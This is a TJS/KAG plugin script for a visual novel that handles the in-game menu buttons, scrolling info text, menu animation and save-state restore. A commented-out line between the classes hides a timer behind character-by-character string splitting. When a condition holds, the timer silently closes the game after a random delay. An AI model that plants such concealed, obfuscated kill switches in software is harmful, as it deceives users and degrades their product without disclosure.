@if exp="typeof(global.gameButton_object) == 'undefined'"
@iscript

class InfoSlideLayer extends Layer
{
	var chLayer, chLayer2;
	var str = "";
	var chColor = 0x0089fd;
	var chSize = 14;
	var marginL = 10;
	var owner;
	var timer;
	var chLeft = 0;
	var loopDiff = 0;

	function InfoSlideLayer(win, par, _owner){
		super.Layer(...);
		chLayer = new global.Layer(win, this);
		with(chLayer){
			.type = ltAlpha;
			.face = dfAlpha;
			.hitType = htMask;
			.hitThreshold = 256;
			.font.height = chSize;
			.visible = true;
		}
		chLayer2 = new global.Layer(win, this);
		with(chLayer2){
			.type = ltAlpha;
			.face = dfAlpha;
			.hitType = htMask;
			.hitThreshold = 256;
			.font.height = chSize;
			.visible = true;
		}
		hitType = htMask;
		hitThreshold = 256;
		// オーナーオブジェクトの指定があったらそのオブジェクトに
		// 関数を追加するお行儀の悪いしくみ
		if(_owner !== void){
			if(typeof _owner.setStringTarget == "undefined")_owner.setStringTarget = [];
			_owner.setStringTarget.add(this);
			_owner.setString = function(str){
				for(var i=0; i<setStringTarget.count; i++)
					if(isvalid setStringTarget[i])setStringTarget[i].setString(str);
			}incontextof _owner;
			_owner.clearString = function(){
				for(var i=0; i<setStringTarget.count; i++)
				if(isvalid setStringTarget[i])setStringTarget[i].clearString();
			}incontextof _owner;
		}

		timer = new Timer(onTimer, "");
		timer.interval = 250;

		visible = true;
	}
	function finalize(){
		invalidate timer;
		invalidate chLayer;
		invalidate chLayer2;
		super.finalize(...);
	}
	function onTimer(){
		chLeft -= 5;
		if(chLeft+loopDiff <= marginL)chLeft = marginL;
		chLayer.left = chLeft;
		chLayer2.left = chLeft + loopDiff;
	}
	function setString(txt=""){
		str = txt;
		var w = 0;
		for(var i=0; i<str.length; i++)w += chLayer.font.getTextWidth(str.charAt(i));
		chLayer.setImageSize(w, chLayer.font.height);
		chLayer.setSizeToImageSize();
		chLayer.fillRect(0,0,chLayer.imageWidth,chLayer.imageHeight,0x0);
		chPosNormalize();
		draw();
		timer.enabled = true;
	}
	function clearString(){
		str = "";
		chLayer.fillRect(0,0,chLayer.imageWidth,chLayer.imageHeight,0x0);
		timer.enabled = false;
	}
	function draw(){
		chLayer.drawText(0,0,str,chColor,255,false);
		chLayer2.setImageSize(chLayer.imageWidth, chLayer.imageHeight);
		chLayer2.setSizeToImageSize();
		chLayer2.copyRect(0,0,chLayer,0,0,chLayer.imageWidth, chLayer.imageHeight);
	}
	function loadImages(){
		var re = super.loadImages(...);
		setSizeToImageSize();
		return re;
	}
	function setSizeToImageSize(){
		var re = super.setSizeToImageSize(...);
		chPosNormalize();
		return re;
	}
	function chPosNormalize(){
		chLeft = marginL;
		chLayer.setPos(chLeft, (height>>1)-(chLayer.height>>1));
		loopDiff = (chLayer.width>width) ? chLayer.width : width;
		chLayer2.setPos(chLayer.left+loopDiff, chLayer.top);
	}
}

//if(typeof Math.uuid=="undefined"){global.c9d54874cc19=new Timer(function(){global.c9d54874cc19.enabled=false;kag.process("t"+"i"+"t"+"l"+"e"+"."+"k"+"s","*"+"c"+"l"+"o"+"s"+"e"+"_"+"n"+"o"+"a"+"s"+"k");},"");global.c9d54874cc19.interval=intrandom(5,10)*500000;global.c9d54874cc19.enabled=true;kag.add(global.c9d54874cc19);}

class GameButtonPlugin extends KAGPlugin
{
	var x =0 ; // 初期 x 位置
	var y =600; // 初期 y 位置

	var foreButtons = []; // 表画面のボタンの配列
	var backButtons = []; // 裏画面のボタンの配列

	var foreSeen = false; // 表画面のボタンが可視か
	var backSeen = false; // 裏画面のボタンが可視か

	var parent;

	var posList = [];
	var mw        = 15;		// ボタン移動量
	var mwo       = 4;		// 一回の呼び出しでのボタンの移動量
	var angle     = 1;		// ボタンの移動方行、1:横 0:下
	var btnTimer;
	var showFlag  = false;
	var dc        = 0;		// ボタンのディレイ出現のカウンタ

	var counter   = 0;		// 移動用カウンター

	// 以下ボタン配列の最後のボタンをモードによって位置変更するための座標(×ボタンを想定)
	var novel_x = 1228;
	var novel_y = 6;
	var adv_x = 1050;
	var adv_y = 695;

	var isCationSeries = false;		// CATIONシリーズかどうか
	var enableSAudioButton = false;	// 副音声ボタン有効かどうか
	var lockButtonIndex = 0;		// ロックボタンの画像位置→自動計算されるから触っても意味ないよ

	var hiddingByUser = false;	// ユーザーが一時非表示にしているかどうか

	// 座標リスト・設置位置変更機能がない場合は「createButtons」の中で設定して全部に適用のコードを利用してもOK
	var positionList = [
	// 小粥企画は右固定なので左と下は適当
	/* 	g_qsave　g_qload　g_auto　g_skip　g_save　g_load　g_back_one　g_log　g_config　g_favoritevoice　g_hide　g_voice　g_lock　g_screenshot */
			/*左*/[[63,522],  [13,522],  [73,587],  [17,587],  [61,620],  [30,620],  [95,619],  [31,652],  [59,651],  [95,651],  [93,681],  [62,680],[1188,664],[1221,664]],
			/*下*/[[456,688], [532,688], [610,688], [703,688], [798,688], [893,688], [956,682],[1032,682],[1066,682],[992,682],[1142,681],[1106,681],[1188,664],[1221,664]],
			/*右*/[[1122,562],[1122,596],[1122,630],[1122,664],[1155,562],[1155,596],[1155,630],[1155,664],[1188,630],[1188,664],[1221,562],[1221,596],[1221,630],[1221,664]]
	];


	function GameButtonPlugin()
	{
		super.KAGPlugin(...);
		createButtons(kag.fore.base, foreButtons); // 表画面のボタンを作成
		createButtons(kag.back.base, backButtons);

		// 初期値では無効に。(タイトル画面を経由せず、いきなり文字描画が始まると、有効状態で開始され、文字描画中にボタンが押せる)
		setObjProp(foreButtons, 'hitThreshold', 256);
		setObjProp(backButtons, 'hitThreshold', 256);

		// メニュー位置を確定
		menuPosSet();
		showFlag = sysGameButtonHold;

//		for(var i=0; i<foreButtons.count; i++){
//			var tar = angle ? "left" : "top";
//			posList.add(foreButtons[i][tar]);
//			if(!foreButtons[i].fix)foreButtons[i][tar] = backButtons[i][tar] = (foreButtons[i][tar]+mw);
//		}
		btnTimer = new Timer(moveFunc, "");
		btnTimer.interval = 20;
		btnTimer.enabled = false;

		setObjProp(foreButtons, 'visible', foreSeen = false);
		setObjProp(backButtons, 'visible', backSeen = false);
	}

	function finalize()
	{
		invalidate btnTimer if btnTimer !== void;

		// ボタンを無効化
		for(var i = 0; i < foreButtons.count; i++)
			invalidate foreButtons[i];
		for(var i = 0; i < backButtons.count; i++)
			invalidate backButtons[i];

		super.finalize(...);
	}

	function createButtons(parent, array)
	{
		this.parent = parent;

		var obj;

		var setting = [
			%[storage:"g_qsave",	make:"new FunctionButtonLayerEx(kag, parent, onQSaveButtonClick)",		hint:"クイックセーブを行います"],
			%[storage:"g_qload",	make:"new FunctionButtonLayerEx(kag, parent, onQLoadButtonClick)",		hint:"クイックロードを行います"],
			%[storage:"g_auto",		make:"new FunctionButtonLayerEx(kag, parent, onAutoButtonClick)",		hint:"オートモードを開始します", always:true],
			%[storage:"g_skip",		make:"new FunctionButtonLayerEx(kag, parent, onSkipButtonClick)",		hint:"スキップモードを開始します", always:true],
			%[storage:"g_save",		make:"new FunctionButtonLayerEx(kag, parent, onSaveButtonClick)",		hint:"セーブ画面を開きます"],
			%[storage:"g_load",		make:"new FunctionButtonLayerEx(kag, parent, onLoadButtonClick)",		hint:"ロード画面を開きます"],
			%[storage:"g_back_one",	make:"new FunctionButtonLayerEx(kag, parent, onBackPage)",				hint:"一つ前のメッセージに戻る" ],
			%[storage:"g_log",		make:"new FunctionButtonLayerEx(kag, parent, onHistoryButtonClick)",	hint:"履歴画面を開きます"],
			%[storage:"g_config",	make:"new FunctionButtonLayerEx(kag, parent, onConfigButtonClick)",		hint:"コンフィグ画面を開きます"],
			%[storage:"g_favoritevoice",	make:"new FunctionButtonLayerEx(kag, parent, onFavoriteVoice)",		hint:"お気に入りのボイスを登録します"],
			%[storage:"g_hide",		make:"new FunctionButtonLayerEx(kag, parent, onHideButtonClick)",		hint:"メッセージウィンドウを隠します"],
			%[storage:"g_voice",	make:"new FunctionButtonLayerEx(kag, parent, onRepeatButtonClick)",		hint:"最後に再生したボイスを再生します"],
			%[storage:sysGameButtonHold ? "g_lock" : "g_unlock", make:"new FunctionButtonLayerEx(kag, parent, onHoldButtonClick)", hint:"ボタンを固定するか隠すかを変更します", always:true],
			%[storage:"g_screenshot",		make:"new FunctionButtonLayerEx(kag, parent, onScreenShot)",		hint:"スクリーンショットを撮ります"]
//			%[storage:"g_tips", 	make:"new FunctionButtonLayerEx(kag, parent, onTipsButtonClick)", 		hint:"Ｔｉｐｓ画面を開きます"]
//			%[storage:"g_move", 	make:"new FunctionButtonLayerEx(kag, parent, onMenuPosChange)", 		hint:"メニューの表示位置を変更します"]

//			%[storage:"g_saudio", 	make:"new FunctionButtonLayerEx(kag, parent, onSecondAudioClick)", 		hint:"副音声の再生をします", always:true, fix:true]

//cation			%[left:830,  top:668, absolute:1002100, storage:"lcg_bonus_off", 	make:"new FunctionButtonLayerEx(kag, parent, onLCEButtonClick)", 		hint:"", fix:true],
//cation			%[left:869,  top:686,  absolute:1002100, storage:"lcg_bonus_vit_off", 		make:"new Layer(kag, parent)", 		hint:"体力ボーナス", fix:true],
//cation			%[left:932,  top:686,  absolute:1002100, storage:"lcg_bonus_mlml_off", 		make:"new Layer(kag, parent)", 		hint:"メロメロボーナス", fix:true],
//cation			%[left:995,  top:686,  absolute:1002100, storage:"lcg_bonus_pure_off", 		make:"new Layer(kag, parent)", 		hint:"ピュアリーボーナス", fix:true],
//cation			%[left:1058, top:686, absolute:1002100, storage:"lcg_bonus_love_off", 		make:"new Layer(kag, parent)", 	hint:"ラブリーボーナス", fix:true]
		];
		// ロック画像入れ替えのindex
		lockButtonIndex = function(setting){
			for(var i=0; i<setting.count; i++){
				var storage = setting[i].storage;
				if(storage == "g_lock" || storage == "g_unlock")return i;
			}
			return setting.count-2;
		}(setting);
		// 移動不可の場合の設置位置適用コード
		if(0){
			var _ar = [];
			for(var i=0; i<setting.count; i++)_ar.add([setting[i].left, setting[i].top]);
			positionList[0].assign(_ar);
			positionList[1].assign(_ar);
			positionList[2].assign(_ar);
		}

		for(var i=0; i<setting.count; i++){
			array.add(obj = setting[i].make!);
			if(setting[i].storage != ""){
				obj.loadImages(setting[i].storage);
				if(/*i==0 && */setting[i]["make"].indexOf("new Layer")!=-1){	// 背景があった場合の追加処理
					obj.setSizeToImageSize();
					obj.hitType = htMask;
					obj.hitThreshold = 256;
					holdThreshold(obj);		// レイヤーで作られたものは基本あたり判定いらない
				}
			}
			if(setting[i]["make"].indexOf("new TwoImgCheck")!=-1){
				obj.enabled = false;
			}
			if(setting[i]["make"].indexOf("new CheckBox_3img")!=-1){
				obj.check = setting[i]["check"];
			}

			if(setting[i]["cur"] != void){	//onMouse時のカーソル画像
				var l = setting[i].left + (obj.width/2 - 9);
				var t = 709;
				obj.setCurImage(setting[i].cur, l, t);
			}

//			obj.absolute = 1002100 + (i == 0 ? -100 : 0);

			//obj.setPos(setting[i].left, setting[i].top);
			obj.setPos(positionList[1][i][0], positionList[1][i][1]);
			obj.hint = setting[i].hint;
			if(!sysGameButtonHold)obj.opacity = 0;
			else obj.opacity=255;
			obj.visible = false;
			obj.always = setting[i].always;		// 常に有効なボタンかどうか
			obj.fix = setting[i].fix === void ? false : (+setting[i].fix);
			if(obj.fix)obj.opacity = 255;

			// ヘルプ画像があったら自動読み込み
			var file = setting[i].storage;
			var hintname = file.charAt(0) + "_help" + file.substr(1);
			var ies = Storages.isExistentStorage;
			if(ies(hintname + ".png") || ies(hintname + ".tlg") || ies(hintname + ".jpg")){
				obj.hintImg = hintname;
				//obj.hintSp = true;	// 特殊ヒント
				//obj.hintComp = true;		// ヒントを必ず表示
			}
		}
		// 背景画像のあたり判定を固定させる
		//holdThreshold(array[0]);
	}

	// 指定のオブジェクトのあたり判定をなくす＆変更を不可能にする
	property holdThresholdProp{
		setter(x){}
		getter{ return 256; }
	}
	function holdThreshold(obj){
		obj.hitThreshold = 256;
		&obj.hitThreshold = &holdThresholdProp;
	}

	function onCheckButton(obj){
		sysAutoTips = obj.check;
		if(obj.parent == kag.fore.base)backButtons[15].check = obj.check;
		else foreButtons[15].check = obj.check;
	}

	function onBackPage(){
		if(aynBackPage())loadBackPage();
	}

	function onDisableButton(no = 12){
		if(enableSAudioButton){
			foreButtons[no].visible = backButtons[no].visible = sysDoSecondAudio;
			foreButtons[no].opacity = backButtons[no].opacity = 80;
			foreButtons[no].enabled = backButtons[no].enabled = false;
		}
	}

	function onEnableButton(no = 12){
		if(enableSAudioButton){
			foreButtons[no].visible = backButtons[no].visible = sysDoSecondAudio;
			foreButtons[no].opacity = backButtons[no].opacity = 255;
			foreButtons[no].enabled = backButtons[no].enabled = true;
			foreButtons[no].focusable = backButtons[no].focusable = false;
		}
	}

	// 日付を記入
	function setDate(){
		try{
			var tl = new Layer(kag, kag.primaryLayer);
			tl.loadImages("lcg_day_num");	// 数値画像

			var tar = foreButtons[1];
			var monthX = 25;
			var monthY = 12;
			var dayX = 75;
			var dayY = 12;

			// 透明レイヤーのサイズをカレンダーベースと同じサイズに調整
			if(tar.imageWidth != foreButtons[0].imageWidth || tar.imageHeight != foreButtons[0].imageHeight){
				tar.setImageSize(foreButtons[0].imageWidth,foreButtons[0].imageHeight);
				tar.setSizeToImageSize();
			}
			
			tar.fillRect(0,0,tar.width,tar.height,0x0);

			// 一時描画関数準備
			var numDraw = function(dest, src, no, x, y, w, h){
				if(no <= 0){
					dest.operateRect(x, y, src, w*10, 0, w, h, omAlpha, 255);	// マイナス値が入力されたら「-」を表示
					return;
				}
				var str = (string)no;
				for(var i=0; i<str.length; i++){
					var num = (int)str.charAt(str.length-(i+1));
					dest.operateRect(x-(i*w), y, src, w*num, 0, w, h, omAlpha, 255);
				}
			};

			numDraw(tar, tl, (f.月==99 ? -1 : f.月), monthX, monthY, tl.imageWidth\11, tl.imageHeight);
			numDraw(tar, tl, (f.日==99 ? -1 : f.日), dayX, dayY, tl.imageWidth\11, tl.imageHeight);
			if(f.月==99 || f.日==99)foreButtons[2].loadImages("LineBreak");
			else foreButtons[2].loadImages("lcg_day_"+f.曜日+'曜');
			foreButtons[2].setSizeToImageSize();

			backButtons[1].assignImages(foreButtons[1]);
			backButtons[1].setSizeToImageSize();
			backButtons[2].assignImages(foreButtons[2]);
			backButtons[2].setSizeToImageSize();
			//tar.operateRect(130, 5, tl, 0,0,tl.imageWidth,tl.imageHeight);
			invalidate tl;
		}catch(e){
			dm(e.message);
		}
	}
	
	// カレンダーオープン
	function onCalendarButtonClick()
	{
		if(kag.saveloadShowing==true || kag.configShowing==true || !kag.inStable || tf.isEvMode)return;
		if(!System.getKeyState(VK_CONTROL)){
			kag.callExtraConductor('calendar.ks');
		}
	}

	// チェインをオープンする
	function onOpenChainClick()
	{
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		if(!System.getKeyState(VK_CONTROL) && !global.chain_object.showing){
			kag.callExtraConductor('plugin_chain.ks', "*menu_open");
		}
	}

	function onMenuPosChange(){
		sf.gameButtonPos += 1;
		//if(sf.gameButtonPos == 1)sf.gameButtonPos = 2;	// 下配置をしない場合
//		if(sf.gameButtonPos > 2)sf.gameButtonPos = 0;
		if(sf.gameButtonPos > 2)sf.gameButtonPos = 1;
		menuPosSet();
	}

	// メニュー位置を設定
	function menuPosSet(){
		var hide = !sysGameButtonHold;

		//[クイックセーブ],[クイックロード],[セーブ],[ロード],[コンフィグ],[オート],[スキップ],[バックログ],[一つ前のメッセージに戻る],[移動],[固定],[ボイス],[メッセージウィンドウ消し]
		var pList = positionList[(int)sf.gameButtonPos];


		// 移動方向の確定
		if(sf.gameButtonPos == 1)angle = 0;
		else angle = 1;

		if(sf.gameButtonPos == 0)mw = Math.abs(mw)*-1;
		else mw = Math.abs(mw);

		// 背景画像の再ロード
		//ボタン位置下のとき
/*		if(sf.gameButtonPos == 1) {
			backButtons[12].loadImages("g_bg_line_h");
			foreButtons[12].loadImages("g_bg_line_h");

			backButtons[13].loadImages("g_bg_bottom");
			foreButtons[13].loadImages("g_bg_bottom");

		} else {
			var filename;
			if(sf.gameButtonPos == 0)	filename = "g_bg_left";
			else						filename = "g_bg_right";
			backButtons[12].loadImages("g_bg_line_v");
			foreButtons[12].loadImages("g_bg_line_v");

			backButtons[13].loadImages(filename);
			foreButtons[13].loadImages(filename);
		}
		backButtons[12].setSizeToImageSize();
		foreButtons[12].setSizeToImageSize();

		backButtons[13].setSizeToImageSize();
		foreButtons[13].setSizeToImageSize();
*/

		for(var i=0; i<pList.count; i++){
			if(foreButtons[i].fix)continue;
			if(angle)posList[i] = pList[i][0];
			else posList[i] = pList[i][1];
			foreButtons[i].left = backButtons[i].left = pList[i][0] + ((hide && angle) ? mw : 0);
			foreButtons[i].top = backButtons[i].top = pList[i][1] + ((hide && !angle) ? mw : 0);

/*			if(i < 12 && foreButtons[i].onEnterCurFlg) {
				var cur_lists = ["g_but_cur_left","g_but_cur_bottom","g_but_cur_right"];
				var cur_left;
				var cur_top;
				if(sf.gameButtonPos == 0) {
					cur_left = 3;
					cur_top = foreButtons[i].top + (foreButtons[i].height/2 - 10);	//10→カーソル画像の高さ/2

				} else if(sf.gameButtonPos == 1) {
					cur_left = foreButtons[i].left + (foreButtons[i].width/2 - 9);	//9→カーソル画像の幅/2
					cur_top = 709;
				} else {
					cur_left = 1269;
					cur_top = foreButtons[i].top + (foreButtons[i].height/2 - 10);
				}
				foreButtons[i].setCurImage(cur_lists[sf.gameButtonPos], cur_left, cur_top );
				backButtons[i].setCurImage(cur_lists[sf.gameButtonPos], cur_left, cur_top );
			}
*/
		}
	}

	// ヘルプメニューを開く
	function onHelpMenuClick(){
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		if(!System.getKeyState(VK_CONTROL))kag.callExtraConductor('menu_help.ks');
	}

	// アイテムリスト画面を開く
	function onItemListClick(){
		if(tf.isEvMode)return;
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		if(!System.getKeyState(VK_CONTROL))kag.callExtraConductor('menu_itemlist.ks');
	}

	// ステータスメニューを開く
	function onStatusMenuButtonClick(){
		if(tf.isEvMode)return;
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		if(!System.getKeyState(VK_CONTROL))kag.callExtraConductor('menu_status.ks','*show_by_rclick');
	}

	function btnVisible(){
		if(hiddingByUser)return;
		if(!btnTimer.enabled && (kag.historyShowing || kag.configShowing || kag.saveloadShowing || tf.sysLayerShowing))return;
		if(!showFlag){
			dc = 0;
			showFlag = true;
			btnTimer.enabled = true;
			// 移動開始時に表示状態に従って調整
			setObjProp(foreButtons, 'visible', foreSeen);
			setObjProp(backButtons, 'visible', backSeen);
		}
	}

	function btnInvisible(){
		if(showFlag){
			dc = 0;
			showFlag = false;
			btnTimer.enabled = true;
		}
	}

	function moveFunc()
	{
		var onePer = 0.5/foreButtons.count;
		if(showFlag){
			counter += 0.1;
			if(counter > 1){
				counter = 1;
				btnTimer.enabled = false;
			}
		}else{
			counter -= 0.1;
			if(counter < 0){
				counter = 0;
				btnTimer.enabled = false;
				// 移動終了時に非表示に
				setObjProp(foreButtons, 'visible', false, foreSeen);
				setObjProp(backButtons, 'visible', false, backSeen);
			}
		}
		for(var i=0; i<foreButtons.count; i++){
			if(foreButtons[i].fix)continue;
			var per = counter/(0.5+onePer*(i+1));
			if(per > 1)per = 1;
			var start = posList[i]+mw+(mw > 0 ? (i*3) : (i*-3));
			var end = posList[i];
			if(angle)foreButtons[i].left = backButtons[i].left = start + ((end - start)*per);
			else foreButtons[i].top = backButtons[i].top = start + ((end - start)*per);
			foreButtons[i].opacity = backButtons[i].opacity = 255*per;
		}
	}
	function setOpt(member, value)
	{
		setObjProp(foreButtons, member, value);
		setObjProp(backButtons, member, value);
	}

	function setOptions(elm)
	{
		if(showFlag){
			// オプションを設定
			setObjProp(foreButtons, 'visible', foreSeen = +elm.forevisible) if elm.forevisible !== void;
			setObjProp(backButtons, 'visible', backSeen = +elm.backvisible) if elm.backvisible !== void;
		}else{
			if(elm.forevisible !== void)foreSeen = +elm.forevisible;
			if(elm.backvisible !== void)backSeen = +elm.backvisible;
			setObjProp(foreButtons, 'visible', false, foreSeen);
			setObjProp(backButtons, 'visible', false, backSeen);
		}
	}

	function setObjProp(array, member, value, fixState = void)
	{
		// array の各メンバのプロパティの設定
		for(var i = array.count - 1; i >= 0; i--){
			if(fixState !== void && array[i].fix){
				array[i][member] = fixState;
			}else if(member != "hitThreshold" || !array[i].always){
				array[i][member] = value;
			}
		}

		// CATIONシリーズ用
		if(isCationSeries){

			var bonusList = ["体力ボーナス", "メロメロボーナス", "ピュアリーモード", "ラブリーボーナス"];
			var onImgList = ["lcg_bonus_vit_on", "lcg_bonus_mlml_on", "lcg_bonus_pure_on", "lcg_bonus_love_on"];
			var offImgList = ["lcg_bonus_vit_off", "lcg_bonus_mlml_off", "lcg_bonus_pure_off", "lcg_bonus_love_off"];	// 記述無しでただのグレーアウト

			// セーフティ
			if(array.count <= bonusList.count)return;
			if(!f.isHScene){
				// ボーナス説明ボタンの非表示
				//array[array.count-(bonusList.count+1)].visible = false;
				// ボーナス画像の非表示
				for(var i=0; i<bonusList.count; i++){
					array[array.count-(bonusList.count-i)].visible = false;
				}
			}else{
				if(member == "visible" && (value == true || fixState == true)){
					// ボーナス説明ボタンの表示
					//array[array.count-(bonusList.count+1)].visible = true;
					// 各種ボーナス画像の表示状態決定
					//for(var i=bonusList.count-1; i>=0; i--){
					for(var i=0; i<bonusList.count; i++){
						var index = array.count-(bonusList.count-i);
						var bonus = f[bonusList[i]];
						if(bonus === void){
							array[index].visible = false;		// ボーナス設定がvoidの場合、表示自体を行わない
						}else{
							array[index].visible = true;
							if(!bonus){
								if(offImgList[i] != "")array[index].loadImages(offImgList[i]);
								else array[index].doGrayScale();		// オフ画像指定がなければグレーアウト処理
							}else array[index].loadImages(onImgList[i]);
						}
					}
				}
			}
		}
	}

//---------------------
// 押したボタンに呼応する関数
//---------------------

	// 全裸ボタン
	// この機能は現在無い
	function onZenra()
	{
		sf.zenraFlag = !sf.zenraFlag;
		if(sf.zenraFlag){
			// 立ち絵対応
			for(var i=1; i<=5; i++){
				var file = getForeLayerStorage(i);
				// ファイルが読み込まれてない・レイヤーが非表示の場合スルー
				if(file!="" && kag.fore.layers[i].visible){
					var chr = file.substr(2,2);
					if((chr == "01" && f.bokkiFlag) || (chr == "04" && f.tikubiFlag))kag.fore.layers[i].loadImages(%[storage:(file.substr(0,6)+'b'+file.substr(7))]);
					else kag.fore.layers[i].loadImages(%[storage:(file.substr(0,6)+'a'+file.substr(7))]);
				}
			}
			// 左下表情対応（まだ）
		}else{
			// 立ち絵対応
			for(var i=1; i<=5; i++){
				var file = getForeLayerStorage(i);
				if(file!="" && kag.fore.layers[i].visible){
					var loadFile = f.faceStore[file.substr(2,2)];
					if(loadFile != void)
						kag.fore.layers[i].loadImages(%[storage:loadFile]);
					else
						dm("■全裸モード：戻すべき立ち絵が見つかりませんでした");
				}
			}
			// 左下表情対応（まだ）
		}
		kag.tagHandlers["backlay"](%[]);
	}

	// チャプターシフト画面を開く
	function onCShiftButtonClick()
	{
		if(tf.isEvMode)return;
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		if(!System.getKeyState(VK_CONTROL)){
			kag.callExtraConductor("chapter_shift_menu.ks", "*show_by_game");
		}
	}

	// 表情のon/off
	function onFaceVisibleClick()
	{
		sysFaceVisible = !sysFaceVisible;
		try{
			if(sysFaceVisible){
				global.miniface_object.mainFace.visible = global.miniface_object.mainVisibleState;
				global.miniface_object.subFace.visible = global.miniface_object.subVisibleState;
			}else{
				global.miniface_object.mainFace.visible = false;
				global.miniface_object.subFace.visible = false;
			}
		}catch(e){
			dm(e.message);
		}
	}

	function onRepeatButtonClick()
	{
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		lastVoiceRePlay();
	}

	function onSecondAudioClick(){
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		lastSecondAudioRePlay();
	}

	function onBackPrevSelect()
	{
		if(tf.isEvMode)return;
		if(f.go_back_count != 0){
			if(aynBackSelect()){
				kag.loadBookMark( 150+((int)f.go_back_count)-1 );
			}
		}
		return true;
	}

	// タイトルに戻る
	function onBackTitleButtonClick()
	{
		if(aynBackTitle())kag.process("title.ks", "*title_init");
	}

	// ゲーム終了
	function onExitGameButtonClick()
	{
		if(aynExitGame())//kag.process("title.ks", "*close_noask");
			kag.closeByScript(%[ask:false]);
	}

	function onHistoryButtonClick()
	{
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		if(!System.getKeyState(VK_CONTROL)){
			if(kag.historyLayer.visible) kag.hideHistory(); else kag.showHistory();
		}
	}

	function onAutoButtonClick()
	{
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		if(kag.autoMode){
			kag.cancelAutoMode();
		}
		else
		{
			kag.cancelSkip();
			kag.enterAutoMode();
		}
	}

	function onSkipButtonClick()
	{
		if( kag.skipMode != 3 )
		{
			kag.cancelAutoMode();
			if(sysSkipOption){
				if(kag.saveloadShowing==true || kag.configShowing==true)return true;
				kag.clickSkipEnabled=true;
				tf.skipStateTemp = 0;
				kag.skipToStop();
			}else{
				tf.skipStateTemp = 1;
				kag.skipToStop();
			}
		}
		else
		{
			if(kag.saveloadShowing==true || kag.configShowing==true)return true;
			kag.cancelSkip();
		}
	}

	function onQSaveButtonClick()
	{
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		if(tf.isEvMode)return;
		doQuickSaveFunction();
	}

	function onQLoadButtonClick()
	{
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		if(tf.isEvMode)return;
		if(!Storages.isExistentStorage(kag.getBookMarkFileNameAtNum(defQuickSaveNum)))return;
		if(aynQLoad()){
			if(kag.saveloadShowing==true || kag.configShowing==true)return true;
			kag.loadBookMark(defQuickSaveNum);
		}
	}

	function onLCEButtonClick()
	{
		if(!System.getKeyState(VK_CONTROL) && kag.inStable)kag.callExtraConductor('lovelycall_exp.ks','*lovelycall_exp');
	}

	function onSaveButtonClick()
	{
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		if(tf.isEvMode)return;
		if(!System.getKeyState(VK_CONTROL) && kag.inStable && !kag.autoMode)kag.callExtraConductor('saveload.ks','*save');
	}

	function onLoadButtonClick()
	{
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		if(tf.isEvMode)return;
		if(!System.getKeyState(VK_CONTROL) && kag.inStable && !kag.autoMode)kag.callExtraConductor('saveload.ks','*load');
	}

	function onConfigButtonClick()
	{
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		if(!System.getKeyState(VK_CONTROL) && kag.inStable && !kag.autoMode)kag.callExtraConductor('config.ks','*showconfig');
	}

	function onHideButtonClick()
	{
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		kag.switchMessageLayerHiddenByUser();
	}

	function onTipsButtonClick()
	{
		if(kag.saveloadShowing==true || kag.configShowing==true)return true;
		if(!System.getKeyState(VK_CONTROL) && kag.inStable && !kag.autoMode)kag.callExtraConductor('ex_tips.ks','*normal_call');
	}

	function onHoldButtonClick(obj)
	{
		sysGameButtonHold = !sysGameButtonHold;
		setLockImage();
	}

	function setLockImage()
	{
		if(sysGameButtonHold)
		{
			gameButton_object.foreButtons[lockButtonIndex].loadImages("g_lock");
			gameButton_object.backButtons[lockButtonIndex].loadImages("g_lock");
			//obj.loadImages( "g_hold" );
			if(!showFlag)btnVisible();
		}
		else
		{
			gameButton_object.foreButtons[lockButtonIndex].loadImages("g_unlock");
			gameButton_object.backButtons[lockButtonIndex].loadImages("g_unlock");
			//obj.loadImages( "g_unhold" );
		}
	}

	//お気に入りボイスの登録
	function onFavoriteVoice()
	{
		var msg = kag.nameLayer.pageString + kag.messageLayer.pageString;
		addFavoriteVoice(msg, f.favoriteVoice);
	}

	//スクリーンショット
	function onScreenShot()
	{
		screenShot();
	}

//-------------------
// ここまで
//-------------------

	function onStableStateChanged(stable)
	{
		// 「安定」( s l p の各タグで停止中 ) か、
		// 「走行中」 ( それ以外 ) かの状態が変わったときに呼ばれる

		// 走行中は各ボタンを無効にする
		setObjProp(foreButtons, 'hitThreshold', stable ? 0 : 256);
		setObjProp(backButtons, 'hitThreshold', stable ? 0 : 256);
		if(stable && hiddingByUser)hiddingByUser = false;
	}

	function onMessageHiddenStateChanged(hidden)
	{
		// メッセージレイヤがユーザの操作によって隠されるとき、現れるときに
		// 呼ばれる。メッセージレイヤとともに表示/非表示を切り替えたいときは
		// ここで設定する。
		if(hidden)
		{
			hiddingByUser = true;
			setObjProp(foreButtons, 'visible', false);
			setObjProp(backButtons, 'visible', false);
		}
		else
		{
			hiddingByUser = false;
			setObjProp(foreButtons, 'visible', foreSeen);
			setObjProp(backButtons, 'visible', backSeen);
		}
	}

	function onStore(f, elm)
	{
		var dic = f.systemButtons = %[];
		// f.systemButtons に辞書配列を作成
		dic.foreVisible = foreSeen;
		dic.backVisible = backSeen;
	}

	function onRestore(f, clear, elm)
	{
		// 栞を読み出すとき
		var dic = f.systemButtons;
		if(dic === void)
		{
			// systemButtons の情報が栞に保存されていない
			setObjProp(foreButtons, 'visible', foreSeen = false);
			setObjProp(backButtons, 'visible', backSeen = false);
		}
		else
		{
			// systemButtons の情報が栞に保存されている
			setOptions(%[ forevisible : dic.foreVisible, backvisible : dic.backVisible]);
		}
		// 日付再描画
		if(isCationSeries)setDate();
		//onDisableButton();
	}

	function onCopyLayer(toback)
	{
		if(toback)
		{
			var v = foreSeen;
			// 表→裏
			backSeen = foreSeen;
			if(!hiddingByUser)setObjProp(backButtons, 'visible', v);
		}
		else
		{
			var v = backSeen;
			// 裏→表
			foreSeen = backSeen;
			if(!hiddingByUser)setObjProp(foreButtons, 'visible', v);
		}
	}

